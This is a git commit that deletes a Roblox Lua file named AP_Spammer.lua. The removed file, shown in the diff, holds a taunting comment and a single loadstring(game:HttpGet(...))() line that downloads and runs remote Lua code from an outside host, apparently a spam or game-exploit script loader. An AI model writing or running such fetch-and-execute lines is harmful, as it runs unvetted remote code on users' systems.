78832d25ba1d1ca129a857c540ff7ae88914b25e
Tio30533 <tioalt3828@gmail.com>
2026-01-18 19:35:39 +0100

    Delete AP_Spammer.lua

--- AP_Spammer.lua
+++
@@ -1,2 +0,0 @@
---[[ Have Fun Getting Past This Skid ]]
-loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/b3872c7871ae20d8b88678d8e1716f430915012da9675487c8f5f3ba06e136c9/download"))()
